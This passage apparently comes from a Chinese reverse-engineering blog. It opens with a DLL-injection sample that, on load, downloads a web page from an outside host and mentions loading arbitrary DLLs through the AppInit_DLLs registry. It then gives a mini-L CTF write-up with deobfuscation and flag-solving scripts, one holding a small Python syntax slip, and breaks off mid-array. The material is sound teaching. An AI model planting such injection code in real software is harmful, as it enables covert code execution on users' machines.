class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// myhack.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;urlmon.lib&quot;</span>)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_URL             (<span class="hljs-string">&quot;http://www.naver.com/index.html&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_FILE_NAME   (<span class="hljs-string">&quot;index.html&quot;</span>)</span><br><br>HMODULE g_hMod = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProc</span><span class="hljs-params">(LPVOID lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    TCHAR szPath[_MAX_PATH] = &#123; <span class="hljs-number">0</span>, &#125;;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetModuleFileName</span>(g_hMod, szPath, MAX_PATH))<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    TCHAR* p = _tcsrchr(szPath, <span class="hljs-string">&#x27;\\&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!p)<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    _tcscpy_s(p + <span class="hljs-number">1</span>, _MAX_PATH, DEF_FILE_NAME); <span class="hljs-comment">//参数准备</span><br><br>    <span class="hljs-built_in">URLDownloadToFile</span>(<span class="hljs-literal">NULL</span>, DEF_URL, szPath, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//调用函数进行URL下载</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><br>    g_hMod = (HMODULE)hinstDLL;<br><br>    <span class="hljs-keyword">switch</span> (fdwReason)<br>    &#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>            <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">&quot;&lt;myhack.dll&gt; Injection!!!&quot;</span>);<br><br>           hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br><br>         <span class="hljs-built_in">CloseHandle</span>(hThread);<br>         <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>windows 操作系统默认提供了AppInit_Dlls和LoadAppInit_Dlls两个注册表，当User32.dll被加载到到进程中，会读取Appinit表中的dll中，加载到进程中。所以可以利用这个特性加载任意的Dll。</p><p>User32.dll是windows图形界面的主要支持。是非常常见的Dll。</p><h2 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx()"></a>SetWindowsHookEx()</h2>]]></content>
    
    
    <categories>
      
      <category>RE</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>mini-L</title>
    <link href="/2024/06/19/mini-L/"/>
    <url>/2024/06/19/mini-L/</url>
    
    <content type="html"><![CDATA[<h1 id="mini-L-部分题目-longlongcall-bigbanana"><a href="#mini-L-部分题目-longlongcall-bigbanana" class="headerlink" title="mini-L 部分题目(longlongcall,bigbanana)"></a>mini-L 部分题目(longlongcall,bigbanana)</h1><h2 id="longlongcall"><a href="#longlongcall" class="headerlink" title="longlongcall"></a>longlongcall</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>64位 ELF 无壳<br><img src="/../res/mini-L_1.1.png"></p><p><img src="/../res/mini-L_1.2.png" alt="ida"><br>有大量类似这样反汇编失败的函数，是一个call&amp;ret类型的花指令,可以看出popfq和pushfq中间的才是有用的指令。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>将无关的指令nop掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs idapython">import idaapi<br>import idc<br>import idautils<br><br><br># Function to search for a byte pattern and return a list of addresses where the pattern is found<br>def find_pattern(pattern):<br>    ea = 0x11D9<br>    end_ea = 0x1E35<br>    addresses = []<br><br>    while ea != idc.BADADDR:<br>        ea = idc.find_binary(ea, end_ea, pattern, 16, idc.SEARCH_DOWN)<br>        if ea != idc.BADADDR:<br>            addresses.append(ea)<br>            ea += len(pattern.split())  # Move to the next position after the pattern length<br>    return addresses<br><br><br># Function to replace a range of bytes with NOP (0x90)<br>def nop_bytes(start_addr, length):<br>    for i in range(length):<br>        idc.patch_byte(start_addr + i, 0x90)  # Replace with NOP<br><br><br># Example usage<br>binary_pattern1 = &quot;E8 02 00 00 00 &quot;  # Example pattern to search (adjust this pattern as needed)<br><br>binary_pattern5 = &quot;C9 C3&quot;<br>binary_pattern2 = &quot;48 83 C4 08&quot;<br>binary_pattern3= &quot;9C&quot;<br>binary_pattern4 = &quot;9D&quot;<br><br><br># Search for the binary pattern<br>addresses = find_pattern(binary_pattern1)<br>print(addresses)<br>pattern_length = len(binary_pattern1.split())<br>for addr in addresses:<br>    nop_bytes(addr, pattern_length)<br><br>addresses = find_pattern(binary_pattern2)<br>print(addresses)<br>pattern_length = len(binary_pattern1.split())<br>for addr in addresses:<br>    nop_bytes(addr, pattern_length)<br><br>addresses = find_pattern(binary_pattern3)<br>print(addresses)<br>pattern_length = len(binary_pattern1.split())<br>for addr in addresses:<br>    nop_bytes(addr, pattern_length)<br><br>addresses = find_pattern(binary_pattern4)<br>print(addresses)<br>pattern_length = len(binary_pattern1.split())<br>for addr in addresses:<br>    nop_bytes(addr, pattern_length)<br><br>addresses = find_pattern(binary_pattern5)<br>print(addresses)<br>pattern_length = len(binary_pattern1.split())<br>for addr in addresses:<br>    nop_bytes(addr, pattern_length)<br><br><br></code></pre></td></tr></table></figure><p>reanalysis<br><img src="/../res/mini-L_1.3.png"><br><img src="/../res/mini_L_1.4.png"></p><p>脚本</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">char</span> ida_chars[<span class="hljs-number">44</span>] =<br>&#123;<br>  <span class="hljs-number">-69</span>,<br>  <span class="hljs-number">-65</span>,<br>  <span class="hljs-number">-71</span>,<br>  <span class="hljs-number">-66</span>,<br>  <span class="hljs-number">-61</span>,<br>  <span class="hljs-number">-52</span>,<br>  <span class="hljs-number">-50</span>,<br>  <span class="hljs-number">-36</span>,<br>  <span class="hljs-number">-98</span>,<br>  <span class="hljs-number">-113</span>,<br>  <span class="hljs-number">-112</span>,<br>  <span class="hljs-number">-112</span>,<br>  <span class="hljs-number">-112</span>,<br>  <span class="hljs-number">-112</span>,<br>  <span class="hljs-number">-112</span>,<br>  <span class="hljs-number">-107</span>,<br>  <span class="hljs-number">-80</span>,<br>  <span class="hljs-number">-83</span>,<br>  <span class="hljs-number">-67</span>,<br>  <span class="hljs-number">-76</span>,<br>  <span class="hljs-number">-120</span>,<br>  <span class="hljs-number">-81</span>,<br>  <span class="hljs-number">-110</span>,<br>  <span class="hljs-number">-48</span>,<br>  <span class="hljs-number">-49</span>,<br>  <span class="hljs-number">-95</span>,<br>  <span class="hljs-number">-93</span>,<br>  <span class="hljs-number">-110</span>,<br>  <span class="hljs-number">-73</span>,<br>  <span class="hljs-number">-76</span>,<br>  <span class="hljs-number">-55</span>,<br>  <span class="hljs-number">-98</span>,<br>  <span class="hljs-number">-108</span>,<br>  <span class="hljs-number">-89</span>,<br>  <span class="hljs-number">-82</span>,<br>  <span class="hljs-number">-16</span>,<br>  <span class="hljs-number">-95</span>,<br>  <span class="hljs-number">-103</span>,<br>  <span class="hljs-number">-64</span>,<br>  <span class="hljs-number">-29</span>,<br>  <span class="hljs-number">-76</span>,<br>  <span class="hljs-number">-76</span>,<br>  <span class="hljs-number">-65</span>,<br>  <span class="hljs-number">-29</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    string flag = <span class="hljs-string">&quot;&quot;</span>;    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">sizeof</span>(ida_chars); i+=<span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> a = <span class="hljs-number">33</span>; a &lt; <span class="hljs-number">127</span>; a++)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> b = <span class="hljs-number">33</span>; b &lt; <span class="hljs-number">127</span>; b++)&#123;<br>                <span class="hljs-type">char</span> v2 = a+b;<br>                <span class="hljs-keyword">if</span>((a ^ v2) == ida_chars[i] &amp;&amp; (b^v2) == ida_chars[i+<span class="hljs-number">1</span>])&#123;<br>                    flag += a;<br>                    flag += b;<br>                   <br>                &#125;<br>    <br>            &#125;<br>        &#125;<br><br>    &#125;<br>    cout &lt;&lt; flag &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>补充一下Z3脚本<br>参考:<a href="https://github.com/XDSEC/miniLCTF_2024/blob/main/Writeups/maet%20radiv%20-%20Writeup%20-%20Mini%20L-CTF%202024.pdf">https://github.com/XDSEC/miniLCTF_2024/blob/main/Writeups/maet%20radiv%20-%20Writeup%20-%20Mini%20L-CTF%202024.pdf</a><br>Z3是由微软公司开发的一个优秀的SMT求解器，它能够检查逻辑表达式的可满足性。可以理解为解方程的工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> typing<br><span class="hljs-keyword">import</span> z3<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>ida_chars =[<br>  -<span class="hljs-number">69</span>,<br>  -<span class="hljs-number">65</span>,<br>  -<span class="hljs-number">71</span>,<br>  -<span class="hljs-number">66</span>,<br>  -<span class="hljs-number">61</span>,<br>  -<span class="hljs-number">52</span>,<br>  -<span class="hljs-number">50</span>,<br>  -<span class="hljs-number">36</span>,<br>  -<span class="hljs-number">98</span>,<br>  -<span class="hljs-number">113</span>,<br>  -<span class="hljs-number">112</span>,<br>  -<span class="hljs-number">112</span>,<br>  -<span class="hljs-number">112</span>,<br>  -<span class="hljs-number">112</span>,<br>  -<span class="hljs-number">112</span>,<br>  -<span class="hljs-number">107</span>,<br>  -<span class="hljs-number">80</span>,<br>  -<span class="hljs-number">83</span>,<br>  -<span class="hljs-number">67</span>,<br>  -<span class="hljs-number">76</span>,<br>  -<span class="hljs-number">120</span>,<br>  -<span class="hljs-number">81</span>,<br>  -<span class="hljs-number">110</span>,<br>  -<span class="hljs-number">48</span>,<br>  -<span class="hljs-number">49</span>,<br>  -<span class="hljs-number">95</span>,<br>  -<span class="hljs-number">93</span>,<br>  -<span class="hljs-number">110</span>,<br>  -<span class="hljs-number">73</span>,<br>  -<span class="hljs-number">76</span>,<br>  -<span class="hljs-number">55</span>,<br>  -<span class="hljs-number">98</span>,<br>  -<span class="hljs-number">108</span>,<br>  -<span class="hljs-number">89</span>,<br>  -<span class="hljs-number">82</span>,<br>  -<span class="hljs-number">16</span>,<br>  -<span class="hljs-number">95</span>,<br>  -<span class="hljs-number">103</span>,<br>  -<span class="hljs-number">64</span>,<br>  -<span class="hljs-number">29</span>,<br>  -<span class="hljs-number">76</span>,<br>  -<span class="hljs-number">76</span>,<br>  -<span class="hljs-number">65</span>,<br>  -<span class="hljs-number">29</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    s = Solver()<br>    x = [z3.BitVec(<span class="hljs-string">f&quot;x<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>,<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ida_chars.__len__())]  <span class="hljs-comment">#解向量</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">44</span>, <span class="hljs-number">2</span>):<br>      v1 = x[i] + x[i + <span class="hljs-number">1</span>]<br>      x[i] ^= v1<br>      x[i + <span class="hljs-number">1</span>] ^= v1<br><br>    <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ida_chars):<br>      s.add(v == x[i])     //条件<br><br>    <span class="hljs-keyword">if</span> s.check() == sat:<br>      m = s.model()<br><br>    result:typing.<span class="hljs-type">Any</span> = [<span class="hljs-number">0</span>] * <span class="hljs-number">44</span><br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> m.decls():<br>      result[<span class="hljs-built_in">int</span>(d.name()[<span class="hljs-number">1</span>:])] = m[d].as_long()<br><br>    <span class="hljs-built_in">print</span>(result)<br><br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>      flag += <span class="hljs-built_in">chr</span>(result[i])<br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve()<br><br><br><br><br></code></pre></td></tr></table></figure><h2 id="bigbanana"><a href="#bigbanana" class="headerlink" title="bigbanana"></a>bigbanana</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>64位 无壳</p><p><img src="/../res/minil2.1.png" alt="ida"><br>很明显是一个VM的题目，先将指令都翻译成汇编指令，然后根据<br>op把指令提取出来。这里的op要改成dd的形式导出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs op">int instrction[] =<br>&#123;<br>   246, 108, 246, 102, 246, 71, 246, 102, 246, 13, 246<br>,102, 246, 5, 246, 102, 246, 19, 246, 102, 246, 10, 246<br>,102, 246, 70, 246, 102, 246, 2, 246, 102, 246, 9, 246<br>,102, 246, 9, 246, 102, 246, 1, 246, 102, 246, 74, 246<br>,102, 246, 21, 246, 102, 246, 3, 246, 102, 246, 18, 246<br>,102, 246, 19, 246, 102, 246, 8, 246, 102, 246, 15, 246<br>,102, 246, 11, 246, 102, 246, 70, 246, 102, 246, 3, 246<br>,102, 246, 3, 246, 102, 246, 20, 246, 102, 246, 14, 246<br>,102, 246, 18, 246, 102, 246, 70, 246, 102, 246, 20<br>,246, 102, 246, 9, 246, 102, 246, 0, 246, 102, 246, 70<br>,246, 102, 246, 2, 246, 102, 246, 3, 246, 102, 246, 21<br>,246, 102, 246, 21, 246, 102, 246, 3, 246, 102, 246<br>,20, 246, 102, 246, 22, 246, 102, 246, 70, 246, 102<br>,246, 2, 246, 102, 246, 20, 246, 102, 246, 7, 246, 102<br>,246, 14, 246, 102, 246, 70, 246, 102, 246, 3, 246, 102<br>,246, 4, 246, 102, 246, 70, 246, 102, 246, 10, 246, 102<br>,246, 10, 246, 102, 246, 15, 246, 102, 246, 17, 246<br>,102, 246, 70, 246, 102, 246, 19, 246, 102, 246, 9, 246<br>,102, 246, 31, 246, 102, 246, 70, 246, 102, 246, 74<br>,246, 102, 246, 31, 246, 102, 246, 10, 246, 102, 246<br>,18, 246, 102, 246, 5, 246, 102, 246, 3, 246, 102, 246<br>,20, 246, 102, 246, 20, 246, 102, 246, 9, 246, 102, 246<br>,5, 246, 102, 246, 8, 246, 102, 246, 15, 246, 102, 246<br>,70, 246, 102, 246, 1, 246, 102, 246, 7, 246, 102, 246<br>,10, 246, 102, 246, 0, 246, 102, 246, 70, 246, 102, 246<br>,3, 246, 102, 246, 14, 246, 102, 246, 18, 246, 102, 246<br>,70, 246, 102, 246, 20, 246, 102, 246, 3, 246, 102, 246<br>,17, 246, 102, 246, 21, 246, 102, 246, 8, 246, 102, 246<br>,7, 246, 102, 246, 70, 246, 102, 246, 19, 246, 102, 246<br>,9, 246, 102, 246, 31, 246, 102, 246, 70, 246, 102, 246<br>,0, 246, 102, 246, 47, 246, 102, 247, 248, 243, 17, 247<br>,248, 243, 17, 247, 248, 243, 17, 247, 248, 243, 17<br>,247, 248, 243, 17, 247, 248, 243, 17, 247, 248, 243<br>,17, 247, 248, 243, 17, 247, 248, 243, 17, 247, 248<br>,243, 17, 247, 248, 243, 17, 247, 248, 243, 17, 247<br>,248, 243, 17, 247, 248, 243, 17, 247, 248, 243, 17<br>,247, 248, 243, 17, 247, 248, 243, 17, 247, 248, 243<br>,17, 247, 248, 243, 17, 247, 248, 243, 17, 247, 248<br>,243, 17, 247, 248, 243, 17, 247, 248, 243, 17, 247<br>,248, 243, 17, 247, 248, 243, 17, 247, 248, 243, 17<br>,247, 248, 243, 17, 247, 248, 243, 17, 247, 248, 243<br>,17, 247, 248, 243, 17, 247, 248, 243, 17, 247, 248<br>,243, 17, 247, 248, 243, 17, 247, 248, 243, 17, 247<br>,248, 243, 17, 247, 248, 243, 17, 247, 248, 243, 17<br>,247, 248, 243, 17, 247, 248, 243, 17, 247, 248, 243<br>,17, 247, 248, 243, 17, 247, 248, 243, 17, 247, 248<br>,243, 17, 247, 248, 243, 17, 247, 248, 243, 17, 247<br>,248, 243, 17, 247, 248, 243, 17, 247, 248, 243, 17<br>,247, 248, 243, 17, 247, 248, 243, 17, 247, 248, 243<br>,17, 247, 248, 243, 17, 247, 248, 243, 17, 247, 248<br>,243, 17, 247, 248, 243, 17, 247, 248, 243, 17, 247<br>,248, 243, 17, 247, 248, 243, 17, 247, 248, 243, 17<br>,247, 248, 243, 17, 247, 248, 243, 17, 247, 248, 243<br>,17, 247, 248, 243, 17, 247, 248, 243, 17, 247, 248<br>,243, 17, 247, 248, 243, 17, 247, 248, 243, 17, 247<br>,248, 243, 17, 247, 248, 243, 17, 247, 248, 243, 17<br>,247, 248, 243, 17, 247, 248, 243, 17, 247, 248, 243<br>,17, 247, 248, 243, 17, 247, 248, 243, 17, 247, 248<br>,243, 17, 247, 248, 243, 17, 247, 248, 243, 17, 247<br>,248, 243, 17, 247, 248, 243, 17, 247, 248, 243, 17<br>,247, 248, 243, 17, 247, 248, 243, 17, 247, 248, 243<br>,17, 247, 248, 243, 17, 247, 248, 243, 17, 247, 248<br>,243, 17, 247, 248, 243, 17, 247, 248, 243, 17, 247<br>,248, 243, 17, 16, 16, 248, 247, 244, 1766746445, 1<br>,1952656716, 244, 0, 243, 242, 489505807, 254, 102, 240<br>,16, 248, 244, 22, 1, 33, 244, 1131796, 243, 242, 1953788496<br>,254, 102, 240, 16, 248, 244, 33, 1, 44, 244, 2263592<br>,243, 242, 2263629, 254, 102, 240, 16, 248, 244, 44<br>,1, 11, 244, 3395388, 243, 242, 3395498, 254, 102, 240<br>,16, 248, 244, 11, 1, 22, 244, 4527184, 243, 242, 4527307<br>,254, 102, 240, 16, 248, 244, 22, 1, 33, 244, 5658980<br>,243, 242, 5658982, 254, 102, 240, 16, 248, 244, 33<br>,1, 44, 244, 6790776, 243, 242, 6791100, 254, 102, 240<br>,16, 248, 244, 44, 1, 11, 244, 7922572, 243, 242, 7922892<br>,254, 102, 240, 16, 248, 244, 11, 1, 22, 244, 9054368<br>,243, 242, 9054537, 254, 102, 240, 16, 248, 244, 22<br>,1, 33, 244, 10186164, 243, 242, 10186440, 254, 102<br>,240, 16, 248, 244, 33, 1, 44, 244, 11317960, 243, 242<br>,11318240, 254, 102, 240, 16, 248, 244, 44, 1, 11, 244<br>,12449756, 243, 242, 12450038, 254, 102, 240, 16, 248<br>,244, 11, 1, 22, 244, 13581552, 243, 242, 13581602, 254<br>,102, 240, 16, 248, 244, 22, 1, 33, 244, 14713348, 243<br>,242, 14713579, 254, 102, 240, 16, 248, 244, 33, 1, 44<br>,244, 15845144, 243, 242, 15845189, 254, 102, 240, 16<br>,248, 244, 44, 1, 11, 244, 16976940, 243, 242, 16977052<br>,254, 102, 240, 16, 248, 244, 11, 1, 22, 244, 18108736<br>,243, 242, 18108814, 254, 102, 240, 16, 248, 244, 22<br>,1, 33, 244, 19240532, 243, 242, 19240500, 254, 102<br>,240, 16, 248, 244, 33, 1, 44, 244, 20372328, 243, 242<br>,20372636, 254, 